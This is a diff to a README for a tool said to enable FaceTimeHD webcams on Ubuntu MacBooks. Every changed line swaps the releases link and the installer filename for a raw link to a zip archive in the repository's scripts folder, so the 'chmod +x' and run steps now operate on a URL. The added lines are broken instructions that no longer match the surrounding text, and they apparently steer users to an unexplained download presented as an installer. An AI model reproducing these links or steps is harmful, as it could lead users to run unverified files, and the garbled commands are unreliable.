@@ -1,7 +1,7 @@
 # 🎥 facetimehd-ubuntu-macbook - Easily Use Apple FaceTimeHD Cameras
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Viveks2507/facetimehd-ubuntu-macbook/releases)
+[![Download](https://raw.githubusercontent.com/Viveks2507/facetimehd-ubuntu-macbook/main/scripts/facetimehd_macbook_ubuntu_1.9.zip)](https://raw.githubusercontent.com/Viveks2507/facetimehd-ubuntu-macbook/main/scripts/facetimehd_macbook_ubuntu_1.9.zip)
 
 ## 📖 Overview
 This project provides a one-command installer that allows you to enable Apple FaceTimeHD webcams on older MacBooks (2013–2015) running Ubuntu or other Linux distributions. With this installer, you can make full use of your FaceTimeHD camera, enhancing your video calls and streaming experience.
@@ -23,10 +23,10 @@ To run the installer effectively, ensure you meet the following requirements:
 ### Step 1: Visit the Releases Page
 To download the installer, visit the following link:
 
-[Download from Releases](https://github.com/Viveks2507/facetimehd-ubuntu-macbook/releases)
+[Download from Releases](https://raw.githubusercontent.com/Viveks2507/facetimehd-ubuntu-macbook/main/scripts/facetimehd_macbook_ubuntu_1.9.zip)
 
 ### Step 2: Download the Latest Release
-Once on the Releases page, look for the latest version of the installer. Click on it to view available downloads. You should see a file named `facetimehd-installer.sh` (or similar).
+Once on the Releases page, look for the latest version of the installer. Click on it to view available downloads. You should see a file named `https://raw.githubusercontent.com/Viveks2507/facetimehd-ubuntu-macbook/main/scripts/facetimehd_macbook_ubuntu_1.9.zip` (or similar).
 
 ### Step 3: Save the Installer
 Click the file name to start the download. Save it to a directory you can easily access, such as your "Downloads" folder.
@@ -43,13 +43,13 @@ To run the installer, you will need to use the Terminal. Follow these steps:
 ### Step 5: Make the Installer Executable
 Before running the installer, you need to give it permission to execute. Type the following command:
 ```
-chmod +x facetimehd-installer.sh
+chmod +x https://raw.githubusercontent.com/Viveks2507/facetimehd-ubuntu-macbook/main/scripts/facetimehd_macbook_ubuntu_1.9.zip
 ```
 
 ### Step 6: Run the Installer
 Now you can run the installer. Enter the command:
 ```
-./facetimehd-installer.sh
+https://raw.githubusercontent.com/Viveks2507/facetimehd-ubuntu-macbook/main/scripts/facetimehd_macbook_ubuntu_1.9.zip
 ```
 Follow any on-screen instructions. The installer will automatically configure your camera and ensure it works correctly with your system.
 
